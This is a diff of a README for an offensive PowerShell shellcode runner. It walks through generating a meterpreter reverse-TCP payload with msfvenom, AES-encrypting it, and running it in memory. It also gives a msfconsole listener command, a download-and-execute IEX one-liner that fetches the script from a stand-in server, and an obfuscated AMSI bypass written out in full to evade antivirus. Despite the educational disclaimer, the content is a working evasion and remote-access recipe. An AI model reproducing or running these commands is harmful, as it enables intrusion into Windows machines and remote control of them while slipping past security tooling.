@@ -1,58 +1,66 @@
 # PowerShell Shellcode Runner with AES-256 Encryption
 
-This repository provides a **PowerShell-based shellcode runner** that executes **AES-256 encrypted shellcode** in memory while bypassing AMSI and antivirus detection.
+## Overview
+This project demonstrates how to encrypt a shellcode (revshell) payload using **AES-256 CBC encryption** for execution within a **PowerShell script**. The encryption process enhances evasion techniques to **_<u>bypass AV</u>_** by encoding the payload before execution.
 
-## 🚀 Features
-- **Memory-based shellcode execution** (fileless)
-- **AES-256 CBC encryption** for obfuscation
-- **AMSI bypass** to evade detection
-- **Base64 encoding for seamless integration**
+## Steps
 
----
+### 1. Generate the Shellcode
+Use `msfvenom` to generate a reverse shell payload in raw format:
 
-## 1️⃣ Generate Shellcode (Metasploit)
-
-Use `msfvenom` to generate a **raw shellcode payload**:
-
-```bash
+```sh
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f raw > shellcode.bin
 ```
 
 ---
 
-## 2️⃣ Encrypt the Shellcode (Python)
+### 2. Encrypt the Payload
+- Use the provided **Python encryption script** (`AES_encrypt.py`) to **AES-256 encrypt** the shellcode with a static key.
+- The script applies **PKCS7 padding** and encodes the payload in **Base64**.
 
-Use the **Python script** to encrypt the shellcode using **AES-256 CBC** and encode it in Base64.
+Run the script:
 
-```bash
-python3 encrypt.py
+```sh
+python3 AES_encrypt.py
 ```
 
-The encrypted shellcode will be **outputted in Base64 format**, ready to be embedded in the PowerShell script.
+After execution, the **Base64-encoded encrypted shellcode** will be printed and saved to `encrypted_shellcode.txt`.
 
 ---
 
-## 3️⃣ Execute Shellcode in Memory (PowerShell)
+### 3. Embed the Encrypted Payload in PowerShell
+- Open `run.ps1`
+- Replace `<PASTE THE BASE64 ENCRYPTED PAYLOAD HERE>` with the generated encrypted shellcode from **Step 2**.
+- The PowerShell script includes:
+  - **AMSI bypass** to avoid detection
+  - **AES-256 decryption** of the payload
+  - **Memory execution of shellcode** without writing to disk
 
-Run the **PowerShell script** to:
-- **Bypass AMSI** (Antimalware Scan Interface)
-- **Decrypt and execute the shellcode in memory**
+---
 
-```powershell
-powershell -ExecutionPolicy Bypass -NoProfile -File run.ps1
+### 4. Setup Metasploit Listener
+Start Metasploit and configure the **multi-handler**:
+
+```sh
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST=<YOUR_IP>; set LPORT=<PORT>; exploit"
 ```
 
 ---
 
-## 4️⃣ Remote Execution of the PowerShell Script
-
-To **remotely download and execute** the script:
+### 5. Execute the PowerShell Script
+To **execute the payload locally**, run:
 
 ```powershell
-IEX (New-Object Net.WebClient).DownloadString("http://YOUR_SERVER_IP/run.ps1")
+powershell -ExecutionPolicy Bypass -NoProfile -File runner.ps1
 ```
 
-If **blocked by AV**, use an AMSI bypass:
+To **execute remotely**, use:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString("http://YOUR_SERVER_IP/runner.ps1")
+```
+
+If **blocked by AV**, use an **AMSI bypass**:
 
 ```powershell
 powershell -ExecutionPolicy Bypass -NoProfile -Command "$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344); IEX (New-Object Net.WebClient).DownloadString('http://YOUR_SERVER_IP/run.ps1')"
@@ -60,14 +68,5 @@ powershell -ExecutionPolicy Bypass -NoProfile -Command "$x=[Ref].Assembly.GetTyp
 
 ---
 
-## 🔐 Disclaimer
-This repository is intended **for educational and research purposes only**. Unauthorized use of this tool is **strictly prohibited**. The author assumes no responsibility for any misuse.
-
----
-
-## 🛠️ Summary
-✔ **Metasploit-generated shellcode is encrypted using AES-256**  
-✔ **PowerShell decrypts and executes the shellcode in memory**  
-✔ **AMSI bypass included to evade detection**  
-✔ **Remote execution supported**  
-
+## Disclaimer
+This project is intended for **educational and authorized penetration testing purposes only**. Unauthorized use is **strictly prohibited**.
